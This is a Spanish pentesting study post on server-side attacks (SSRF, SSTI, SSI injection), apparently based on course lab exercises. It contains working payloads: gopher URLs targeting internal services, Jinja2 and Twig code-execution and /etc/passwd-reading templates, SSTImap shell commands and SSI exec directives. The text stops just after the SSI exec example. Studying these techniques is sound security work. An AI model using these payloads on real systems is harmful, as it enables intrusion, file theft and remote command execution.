---
title: Server side attacks
date: 2026-02-07 11:00:00 +0000
categories: [Web, apuntes]
tags: [pentesting, web, Server side attacks]
image:
  path: /assets/img/posts/server-side-attacks/cabecera.jpg
  alt: cabecera
description: >
   Server side attacks

pin: false  
toc: true   
math: false 
mermaid: false 
---

Los ataques del lado del servidor se dirigen a la aplicación o al servicio proporcionado por un servidor, mientras que los ataques del lado del cliente tienen lugar en el equipo del cliente, no en el propio servidor. 

Por ejemplo, vulnerabilidades como el Cross-Site Scripting (XSS) se dirigen al navegador web, es decir, al cliente. Por otro lado, los ataques del lado del servidor se dirigen al servidor web.

- Falsificación de solicitudes del lado del servidor (SSRF)
- Inyección de plantillas del lado del servidor (SSTI)
- Inyección de inclusiones del lado del servidor (SSI)
 - Transformaciones de lenguaje de hojas de estilo extensibles (XSLT) Inyección del lado del servidor


### Server-Side Request Forgery (SSRF)

[SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) es una vulnerabilidad que permite a un atacante manipular una aplicación web para que envíe solicitudes no autorizadas desde el servidor. Esta vulnerabilidad suele producirse cuando una aplicación realiza solicitudes HTTP a otros servidores basándose en la información introducida por el usuario. La explotación exitosa de SSRF puede permitir a un atacante acceder a sistemas internos, eludir cortafuegos y recuperar información confidencial.

### Server-Side Template Injection (SSTI)

Las aplicaciones web pueden utilizar motores de plantillas y plantillas del lado del servidor para generar respuestas, como contenido HTML, de forma dinámica. Esta generación suele basarse en la entrada del usuario, lo que permite a la aplicación web responder a la entrada del usuario de forma dinámica. Cuando un atacante puede inyectar código de plantilla, puede producirse una vulnerabilidad de inyección de plantillas del lado del servidor. La [SSTI](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) puede dar lugar a diversos riesgos de seguridad, como la fuga de datos e incluso el compromiso total del servidor mediante la ejecución remota de código.

### Server-Side Includes (SSI) Injection

Al igual que las plantillas del lado del servidor, las [inclusiones del lado del servidor (SSI)](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) se pueden utilizar para generar respuestas HTML de forma dinámica. Las directivas SSI indican al servidor web que incluya contenido adicional de forma dinámica. Estas directivas se incrustan en archivos HTML. Por ejemplo, las SSI se pueden utilizar para incluir contenido que está presente en todas las páginas HTML, como encabezados o pies de página. Cuando un atacante puede inyectar comandos en las directivas SSI, puede producirse una inyección de inclusiones del lado del servidor (SSI). La inyección SSI puede provocar la fuga de datos o incluso la ejecución remota de código.

### XSLT Server-Side Injection

La inyección del lado del servidor XSLT (Extensible Stylesheet Language Transformations) es una vulnerabilidad que surge cuando un atacante puede manipular las transformaciones XSLT realizadas en el servidor. XSLT es un lenguaje utilizado para transformar documentos XML a otros formatos, como HTML, y se emplea comúnmente en aplicaciones web para generar contenido de forma dinámica. En el contexto de la inyección del lado del servidor XSLT, los atacantes aprovechan las debilidades en la forma en que se manejan las transformaciones XSLT, lo que les permite inyectar y ejecutar código arbitrario en el servidor.

## Server-side Request Forgery

Supongamos que un servidor web obtiene recursos remotos basándose en la información introducida por el usuario. En ese caso, un atacante podría obligar al servidor a realizar solicitudes a direcciones URL arbitrarias proporcionadas por él, es decir, el servidor web sería vulnerable a SSRF. Aunque a primera vista esto no parezca especialmente grave, dependiendo de la configuración de la aplicación web, las vulnerabilidades SSRF pueden tener consecuencias devastadoras.

Además, si la aplicación web se basa en un esquema o protocolo URL proporcionado por el usuario, un atacante podría provocar un comportamiento aún más indeseado manipulando el esquema URL. Por ejemplo, los siguientes esquemas URL se utilizan habitualmente en la explotación de vulnerabilidades SSRF:

- http:// y https://: estos esquemas URL obtienen contenido a través de solicitudes HTTP/S. Un atacante podría utilizarlo en la explotación de vulnerabilidades SSRF para eludir los WAF, acceder a puntos finales restringidos o acceder a puntos finales en la red interna.

- file://: este esquema URL lee un archivo del sistema de archivos local. Un atacante podría utilizarlo en la explotación de vulnerabilidades SSRF para leer archivos locales en el servidor web (LFI).

- gopher://: este protocolo puede enviar bytes arbitrarios a la dirección especificada. Un atacante podría utilizarlo para explotar vulnerabilidades SSRF con el fin de enviar solicitudes HTTP POST con payloads arbitrarios o comunicarse con otros servicios, como servidores SMTP o bases de datos.

### Identificando & confirmando SSRF

![Pasted image 20251113202717](/assets/img/posts/server-side-attacks/Pasted%20image%2020251113202717.png)

![Pasted image 20251113202726](/assets/img/posts/server-side-attacks/Pasted%20image%2020251113202726.png)

Como podemos ver, la solicitud contiene la fecha elegida y una URL en el parámetro **dateserver**. Esto indica que el servidor web obtiene la información de disponibilidad de un sistema independiente determinado por la URL pasada en este parámetro POST.

Para confirmar una vulnerabilidad SSRF, proporcionemos una URL que apunte a nuestro sistema a la aplicación web.

![Pasted image 20251113202846](/assets/img/posts/server-side-attacks/Pasted%20image%2020251113202846.png)

```shell-session
$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

Para determinar si la respuesta HTTP refleja la respuesta SSRF que nos envía, apuntemos la aplicación web hacia sí misma proporcionando la URL `http://127.0.0.1/index.php`.

![Pasted image 20251113203005](/assets/img/posts/server-side-attacks/Pasted%20image%2020251113203005.png)

Dado que la respuesta contiene el código HTML de la aplicación web, la vulnerabilidad SSRF no es ciega, es decir, la respuesta se nos muestra.

### Enumeración del sistema

Podemos utilizar la vulnerabilidad SSRF para realizar un escaneo de puertos del sistema y enumerar los servicios en ejecución. Para ello, necesitamos poder deducir si un puerto está abierto o cerrado a partir de la respuesta a nuestro payload SSRF. Si proporcionamos un puerto que suponemos que está cerrado (como el 81), la respuesta contiene un mensaje de error.

![Pasted image 20251113203115](/assets/img/posts/server-side-attacks/Pasted%20image%2020251113203115.png)

Esto nos permite realizar un escaneo interno de puertos del servidor web a través de la vulnerabilidad SSRF. Podemos hacerlo utilizando un fuzzer como ffuf. Primero, creemos una lista de palabras con los puertos que queremos escanear. En este caso, utilizaremos los primeros 10 000 puertos.

```shell-session
$ seq 1 10000 > ports.txt
```

```shell-session
$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

<SNIP>

[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```

Los resultados muestran que el servidor web ejecuta un servicio en el puerto 3306, que suele utilizarse para bases de datos SQL. Si el servidor web ejecutara otros servicios internos, como aplicaciones web internas, también podríamos identificarlos y acceder a ellos a través de la vulnerabilidad SSRF.


### Explotando SSRF

#### Acceso a endpoints restringidos

Como hemos visto, la aplicación web obtiene información sobre la disponibilidad desde la URL dateserver.htb. Sin embargo, cuando añadimos este dominio a nuestro archivo hosts e intentamos acceder a él, no podemos hacerlo.

![Pasted image 20251116150416](/assets/img/posts/server-side-attacks/Pasted%20image%2020251116150416.png)

Sin embargo, podemos acceder y enumerar el dominio a través de la vulnerabilidad SSRF. Por ejemplo, podemos llevar a cabo un ataque de fuerza bruta al directorio para enumerar puntos finales adicionales utilizando ffuf. Para ello, determinemos primero la respuesta del servidor web cuando accedemos a una página que no existe.

![Pasted image 20251116150455](/assets/img/posts/server-side-attacks/Pasted%20image%2020251116150455.png)

Como podemos ver, el servidor web responde con la respuesta 404 predeterminada de Apache. Para filtrar también cualquier respuesta HTTP 403, filtraremos nuestros resultados basándonos en la cadena Server at dateserver.htb Port 80, que se encuentra en las páginas de error predeterminadas de Apache. Dado que la aplicación web ejecuta PHP, especificaremos la extensión .php.

```shell-session
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"

<SNIP>

[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```

Hemos identificado con éxito un endpoint interno adicional al que ahora podemos acceder a través de la vulnerabilidad SSRF especificando la URL http://dateserver.htb/admin.php en el parámetro POST del servidor de fechas para acceder potencialmente a información administrativa confidencial.

#### Local file inclusion (LFI)

Como hemos visto, el esquema de la URL es parte de la entrada por lo que podemos modificarlo usando "file://" para intentar leer archivos del sistema.

![Pasted image 20260205182724](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205182724.png)

Podemos usar esto para leer archivos arbitrarios en el sistema de archivos, incluido el código fuente de la aplicación web. 

#### El protocolo "gopher"

Podemos utilizar SSRF para acceder a endpoints internos restringidos. Sin embargo, estamos limitados a las solicitudes GET, ya que no hay forma de enviar una solicitud POST con el esquema de URL "http://". 

Por ejemplo, consideremos una versión diferente de la aplicación web anterior. Supongamos que hemos identificado el punto final interno /admin.php igual que antes, pero esta vez la respuesta es la siguiente:

![Pasted image 20260205182924](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205182924.png)

Como podemos ver, el punto final de administración está protegido por un mensaje de inicio de sesión. A partir del formulario HTML, podemos deducir que necesitamos enviar una solicitud POST a /admin.php que contenga la contraseña en el parámetro POST "adminpw". Sin embargo, no hay forma de enviar esta solicitud POST utilizando el esquema de URL "http://".

En su lugar, podemos utilizar el esquema URL "gopher" para enviar bytes arbitrarios a un socket TCP. Este protocolo nos permite crear una solicitud POST construyendo nosotros mismos la solicitud HTTP. Suponiendo que queremos probar contraseñas débiles comunes, como «admin», podemos enviar la siguiente solicitud POST:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

Necesitamos codificar en URL todos los caracteres especiales para construir una URL "gopher" válida a partir de esto. En particular, los espacios (%20) y los saltos de línea (%0D%0A) deben codificarse en URL. 
Después, debemos anteponer a los datos el esquema URL gopher, el host y el puerto de destino, y un guión bajo.

```url
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Nuestros bytes especificados se envían al destino cuando la aplicación web procesa esta URL. Dado que hemos elegido cuidadosamente los bytes para representar una solicitud POST válida, el servidor web interno acepta nuestra solicitud POST y responde en consecuencia. Sin embargo, dado que estamos enviando nuestra URL dentro del parámetro HTTP POST dateserver, que en sí mismo está codificado en URL, necesitamos codificar en URL toda la URL de nuevo para garantizar el formato correcto de la URL después de que el servidor web la acepte. De lo contrario, obtendremos un error de URL malformada. 

Después de codificar en URL toda la URL gopher una vez más, finalmente podemos enviar la siguiente solicitud:

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

![Pasted image 20260205183516](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205183516.png)

Podemos utilizar el protocolo Gopher para interactuar con muchos servicios internos, no solo con servidores HTTP. 
Imaginemos un escenario en el que identificamos, a través de una vulnerabilidad SSRF, que el puerto TCP 25 está abierto en el sistema local. Este es el puerto estándar para los servidores SMTP. También podemos utilizar Gopher para interactuar con este servidor SMTP interno. Sin embargo, construir URL Gopher sintáctica y semánticamente correctas puede llevar mucho tiempo y esfuerzo. 

Por lo tanto, se puede utilizar la herramienta Gopherus para generar URL Gopher la cual admite los siguientes servicios:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

Generemos una URL SMTP válida proporcionando el argumento correspondiente. La herramienta nos pide que introduzcamos los datos del correo electrónico que queremos enviar. A continuación, proporciona una URL gopher válida que podemos utilizar en nuestra explotación SSRF:

```shell-session
$ python2.7 gopherus.py --exploit smtp

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

### Blind SSRF

En muchas vulnerabilidades SSRF del mundo real, la respuesta no se nos muestra directamente. Estos casos se denominan vulnerabilidades SSRF "ciegas" porque no podemos ver la respuesta. 

#### Identificando un blind SSRF

La aplicación web se comporta de la misma manera que la anterior. Podemos confirmar la vulnerabilidad SSRF tal y como hicimos antes, proporcionando una URL a un sistema bajo nuestro control y configurando un listener netcat:

```shell-session
$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

Sin embargo, si intentamos dirigir la aplicación web hacia sí misma, podemos observar que la respuesta no contiene la respuesta HTML de la solicitud forzada. En su lugar, simplemente nos informa de que la fecha no está disponible. Por lo tanto, se trata de una vulnerabilidad SSRF ciega.

![Pasted image 20260205185516](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205185516.png)

#### Explotando un blind SSRF

Por lo general, está muy limitada en comparación con las vulnerabilidades SSRF normales. Sin embargo, dependiendo del comportamiento de la aplicación web, es posible que aún podamos realizar un escaneo de puertos local (restringido) del sistema, siempre que la respuesta sea diferente para los puertos abiertos y cerrados. 
En este caso, la aplicación web responde con «¡Algo salió mal!» para los puertos cerrados.

![Pasted image 20260205185807](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205185807.png)

Sin embargo si un puerto está abierto responde con un error diferente.

![Pasted image 20260205185855](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205185855.png)

Dependiendo de cómo la aplicación web detecte los errores inesperados, es posible que no podamos identificar los servicios en ejecución que no responden con respuestas HTTP válidas. Por ejemplo, no podemos identificar el servicio MySQL en ejecución utilizando esta técnica:

![Pasted image 20260205190012](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205190012.png)

Además, aunque no podemos leer archivos locales como antes, aún podemos usar la misma técnica para identificar archivos existentes en el sistema de archivos. Esto se debe a que el mensaje de error es diferente para archivos existentes y no existentes, al igual que difiere para puertos abiertos y cerrados:

![Pasted image 20260205190036](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205190036.png)

![Pasted image 20260205190045](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205190045.png)

Aunque no podemos utilizar vulnerabilidades SSRF ciegas para extraer datos directamente, como hicimos en las secciones anteriores, podemos emplear las técnicas descritas para enumerar los puertos abiertos en la red local o enumerar los archivos existentes en el sistema de archivos. Esto puede revelar información sobre la arquitectura del sistema subyacente que puede ayudar a preparar ataques posteriores. 

Hay que tener en cuenta que, aunque la aplicación web responda con el mismo mensaje de error tanto para los puertos abiertos como para los cerrados, podemos seguir interactuando con la red interna, aunque sea a ciegas. Por lo tanto, podemos explotar potencialmente las aplicaciones web internas adivinando los payloads comunes.

## Template Engines (motores de plantillas)

Los motores de plantillas suelen requerir dos entradas: una plantilla y un conjunto de valores que se insertarán en la plantilla. La plantilla suele proporcionarse como una cadena o un archivo y contiene lugares predefinidos donde el motor de plantillas inserta los valores generados dinámicamente. 
Los valores se proporcionan como pares clave-valor, lo que permite al motor de plantillas colocar el valor proporcionado en la ubicación de la plantilla marcada con la clave correspondiente. La generación de una cadena a partir de la plantilla de entrada y los valores de entrada se denomina renderización.

La sintaxis de la plantilla depende del motor de plantillas concreto que se utilice. Por ejemplo para el motor de renderizado Jinja las expresiones son como la siguiente:

```jinja2
Hello {{ name }}!
```

Contiene una única variable llamada name, que se sustituye por un valor dinámico durante la representación. Cuando se representa la plantilla, se debe proporcionar al motor de plantillas un valor para la variable name. Por ejemplo, si proporcionamos la variable name="test" a la función de representación, el motor de plantillas generará la siguiente cadena:

```txt
Hello test!
```

Como podemos ver, el motor de plantillas simplemente sustituye la variable de la plantilla por el valor dinámico proporcionado a la función de renderizado.

Aunque el ejemplo anterior es muy sencillo, muchos motores de plantillas modernos admiten operaciones más complejas que suelen ofrecer los lenguajes de programación, como condiciones y bucles. Por ejemplo:

```jinja2
{% for name in names %}
Hello {{ name }}!
{% endfor %}
```

La plantilla contiene un bucle «for» que recorre todos los elementos de una variable llamada «names». Por lo tanto, debemos proporcionar a la función de renderizado un objeto en la variable «names» sobre el que pueda iterar. Por ejemplo, si pasamos a la función una lista como «names=[«test», “test2”, «test3»]», el motor de plantillas generará la cadena:

```txt
Hello test!
Hello test2!
Hello test3!
```

### Server-side Template Injection

Como hemos visto en la sección anterior, la representación de plantillas trata inherentemente con valores dinámicos proporcionados al motor de plantillas durante la representación. A menudo, estos valores dinámicos son proporcionados por el usuario. Sin embargo, los motores de plantillas pueden manejar las entradas del usuario de forma segura si se proporcionan como valores a la función de renderización. 

Esto se debe a que los motores de plantillas insertan los valores en los lugares correspondientes de la plantilla y no ejecutan ningún código dentro de los valores. Por otro lado, el SSTI se produce cuando un atacante puede controlar el parámetro de la plantilla, ya que los motores de plantillas ejecutan el código proporcionado en la plantilla.

Si la plantilla se implementa correctamente, la entrada del usuario siempre se proporciona a la función de renderizado en valores y nunca en la cadena de la plantilla. Sin embargo, puede producirse un SSTI cuando la entrada del usuario se inserta en la plantilla antes de que se llame a la función de renderizado en la plantilla. Otro caso diferente sería si una aplicación web llamara a la función de renderización en la misma plantilla varias veces. Si la entrada del usuario se inserta en la salida del primer proceso de renderización, se consideraría parte de la cadena de la plantilla en el segundo proceso de renderización, lo que podría dar lugar a un SSTI. 

Por último, las aplicaciones web que permiten a los usuarios modificar o enviar plantillas existentes dan lugar a una vulnerabilidad SSTI evidente.

### Identificar SSTI

Necesitamos identificar el motor de plantillas que utiliza la aplicación web objetivo, ya que el proceso de explotación depende en gran medida del motor de plantillas concreto que se utilice. Esto se debe a que cada motor de plantillas utiliza una sintaxis ligeramente diferente y admite diferentes funciones que podemos utilizar.

La forma más eficaz es inyectar caracteres especiales con significado semántico en los motores de plantillas y observar el comportamiento de la aplicación web. Por ello, la siguiente cadena de prueba se utiliza habitualmente para provocar un mensaje de error en una aplicación web vulnerable a SSTI, ya que contiene todos los caracteres especiales que tienen un propósito semántico concreto en los motores de plantillas más populares:

{% raw %}
```shell
${{<%[%'"}}%\.
```
{% endraw %}

Dado que la cadena de prueba anterior casi con toda seguridad infringirá la sintaxis de la plantilla, debería dar lugar a un error si la aplicación web es vulnerable a SSTI. Este comportamiento es similar a cómo la inserción de una comilla simple (') en una aplicación web vulnerable a la inyección SQL puede romper la sintaxis de una consulta SQL, lo que da lugar a un error SQL.

![Pasted image 20260205201314](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201314.png)

Para comprobar si existe una vulnerabilidad SSTI, podemos inyectar la cadena de prueba mencionada anteriormente. Esto da como resultado la siguiente respuesta de la aplicación web:

![Pasted image 20260205201330](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201330.png)

### Identificar el motor de plantillas.

![Pasted image 20260205201424](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201424.png)

Comenzaremos inyectando el payload `${7*7}` y seguiremos el diagrama de izquierda a derecha, dependiendo del resultado de la inyección. 

Al inyectar la carga útil `${7*7}`, se produce el siguiente comportamiento:

![Pasted image 20260205201629](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201629.png)

Dado que no se ejecutó, seguimos la flecha roja e inyectamos ahora la carga útil `{{7*7}}`:

![Pasted image 20260205201721](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205201721.png)

En esta ocasión, fue ejecutado por el motor de plantillas. Por lo tanto, seguimos la flecha verde e inyectamos `{{7*“7”}}`. El resultado nos permitirá deducir el motor de plantillas utilizado por la aplicación web. En Jinja, el resultado será 7777777, mientras que en Twig, el resultado será 49.

### Explotando Jinja2

Jinja es un motor de plantillas que se utiliza habitualmente en marcos web de Python, como Flask o Django. Esta sección se centrará en una aplicación web Flask. 

En nuestro payload, podemos utilizar libremente cualquier biblioteca que ya haya sido importada por la aplicación Python, ya sea directa o indirectamente. Además, es posible que podamos importar bibliotecas adicionales mediante el uso de la instrucción import.

#### Information Disclosure

Podemos aprovechar la vulnerabilidad SSTI para obtener información interna sobre la aplicación web, incluidos los detalles de configuración y el código fuente de la aplicación web. Por ejemplo, podemos obtener la configuración de la aplicación web utilizando:

```jinja2
{{ config.items() }}
```

![Pasted image 20260205203044](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203044.png)

Dado que vuelca toda la configuración de la aplicación web, incluidas las claves secretas utilizadas, podemos preparar nuevos ataques utilizando la información obtenida. También podemos ejecutar código Python para obtener información sobre el código fuente de la aplicación web. 

Podemos utilizar el siguiente payload para volcar todas las funciones integradas disponibles:

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

![Pasted image 20260205203151](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203151.png)

#### Local File Inclusion (LFI)

Podemos utilizar la función integrada open de Python para incluir un archivo local. Sin embargo, no podemos llamar a la función directamente; tenemos que llamarla desde el diccionario __builtins__ que hemos volcado anteriormente.
Esto da como resultado el siguiente payload para incluir el archivo /etc/passwd:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![Pasted image 20260205203304](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203304.png)

#### Remote code execution (RCE)

Para lograr la ejecución remota de código en Python, podemos utilizar funciones proporcionadas por la biblioteca os, como system o popen. Sin embargo, si la aplicación web aún no ha importado esta biblioteca, primero debemos importarla llamando a la función integrada import. 

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![Pasted image 20260205203348](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205203348.png)

### Explotando Twig

Twig es un motor de plantillas para el lenguaje de programación PHP.

#### Information Disclosure

En Twig, podemos usar la palabra clave `{{ _self }}` para obtener un poco de información sobre la plantilla actual:

```twig
{{ _self }}
```

![Pasted image 20260205204305](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205204305.png)

#### Local FIle Inclusion (LFI)

Leer archivos locales (sin utilizar el mismo método que utilizaremos para RCE) no es posible utilizando las funciones internas proporcionadas directamente por Twig. Sin embargo, el marco web PHP Symfony define filtros Twig adicionales. Uno de estos filtros es file_excerpt y se puede utilizar para leer archivos locales:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

![Pasted image 20260205205529](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205205529.png)

#### Remote Code Execution (RCE)

Para lograr la ejecución remota de código, podemos utilizar una función integrada en PHP, como system. Podemos pasar un argumento a esta función utilizando la función de filtro de Twig, lo que da como resultado:

```twig
{{ ['id'] | filter('system') }}
```

![Pasted image 20260205205604](/assets/img/posts/server-side-attacks/Pasted%20image%2020260205205604.png)

### Herramientas profesionales de SSTI

La herramienta más popular para identificar y explotar vulnerabilidades SSTI es tplmap. Sin embargo, tplmap ya no se mantiene y se ejecuta en la versión obsoleta de Python 2. Por lo tanto, utilizaremos la herramienta más moderna SSTImap para facilitar el proceso de explotación de SSTI.

```shell-session
$ git clone https://github.com/vladko312/SSTImap

$ cd SSTImap

$ pip3 install -r requirements.txt

$ python3 sstimap.py 

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
                             │ | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4
[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```

Para identificar automáticamente cualquier vulnerabilidad SSTI, así como el motor de plantillas utilizado por la aplicación web, debemos proporcionar a SSTImap la URL de destino:

```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test

<SNIP>

[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

Como podemos ver, SSTImap confirma la vulnerabilidad SSTI e identifica correctamente el motor de plantillas Twig. También proporciona capacidades que podemos utilizar durante la explotación. Por ejemplo, podemos descargar un archivo remoto a nuestra máquina local utilizando el indicador -D:

```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

<SNIP>

[+] File downloaded correctly
```

Además, podemos ejecutar un comando del sistema utilizando el indicador -S:

```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

<SNIP>

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como alternativa, podemos usar --os-shell para obtener un shell interactivo:

```shell-session
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

<SNIP>

[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```

## SSI Injection

Las inclusiones del lado del servidor (SSI) son una tecnología que utilizan las aplicaciones web para crear contenido dinámico en páginas HTML. SSI es compatible con muchos servidores web populares, como Apache e IIS. 
El uso de SSI a menudo se puede deducir de la extensión del archivo. Las extensiones de archivo típicas incluyen .shtml, .shtm y .stm. Sin embargo, los servidores web se pueden configurar para admitir directivas SSI en extensiones de archivo arbitrarias. Por lo tanto, no podemos determinar de manera concluyente si se utiliza SSI basándonos únicamente en la extensión del archivo.

La inyección SSI se produce cuando un atacante puede inyectar directivas SSI en un archivo que posteriormente es servido por el servidor web, lo que da lugar a la ejecución de las directivas SSI inyectadas. Este escenario puede darse en diversas circunstancias. 

Por ejemplo, cuando la aplicación web contiene una vulnerabilidad en la carga de archivos que permite a un atacante cargar un archivo que contiene directivas SSI maliciosas en el directorio raíz web. Además, los atacantes podrían inyectar directivas SSI si una aplicación web escribe la entrada del usuario en un archivo del directorio raíz web.
### Directivas SSI

SSI utiliza directivas para añadir contenido generado dinámicamente a una página HTML estática. Estas directivas constan de los siguientes componentes:

- **nombre**: el nombre de la directiva.

- **nombre del parámetro**: uno o más parámetros.

- **valor**: uno o más valores de parámetro.

Una directiva SSI tiene la siguiente sintaxis:

```ssi
<!--#name param1="value1" param2="value" -->
```

Por ejemplo, las siguientes son algunas directivas SSI comunes.

1. **printenv**

Esta directiva imprime variables de entorno. No toma ninguna variable.

```ssi
<!--#printenv -->
```

2.  **config**

Esta directiva cambia la configuración de SSI especificando los parámetros correspondientes. Por ejemplo, se puede utilizar para cambiar el mensaje de error utilizando el parámetro errmsg:

```ssi
<!--#config errmsg="Error!" -->
```

3. **echo**

Esta directiva imprime el valor de cualquier variable dada en el parámetro var. Se pueden imprimir varias variables especificando varios parámetros var. Por ejemplo, se admiten las siguientes variables:

- DOCUMENT_NAME: el nombre del archivo actual.

- DOCUMENT_URI: el URI del archivo actual.

- LAST_MODIFIED: marca de tiempo de la última modificación del archivo actual.

- DATE_LOCAL: hora local del servidor.

```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

4. **exec**

Esta directiva ejecuta el comando especificado en el parámetro cmd:

```ssi
<!--#exec cmd="whoami" -->
```

5. **include**

Esta directiva incluye el archivo especificado en el parámetro virtual. Solo permite la inclusión de archivos en el directorio raíz web.

```ssi
<!--#include virtual="index.html" -->
```

### Explotación de SSI

Si introducimos nuestro nombre, se nos redirige a /page.shtml, donde se muestra información general:

![Pasted image 20260207203334](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207203334.png)
![Pasted image 20260207203305](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207203305.png)

Podemos suponer que la página es compatible con SSI basándonos en la extensión del archivo. Si nuestro nombre de usuario se inserta en la página sin una limpieza previa, podría ser vulnerable a una inyección SSI. Confirmemos esto proporcionando un nombre de usuario de `<!--#printenv -->.` El resultado es la siguiente página:

![Pasted image 20260207203419](/assets/img/posts/server-side-attacks/Pasted%20image%2020260207203419.png)

Como podemos ver, la directiva se ejecuta y se imprimen las variables de entorno. Por lo tanto, hemos confirmado con éxito una vulnerabilidad de inyección SSI. Confirmemos que podemos ejecutar comandos arbitrarios utilizando la directiva exec proporcionando el siguiente nombre de usuario: `<!--#exec cmd="id" -->`:

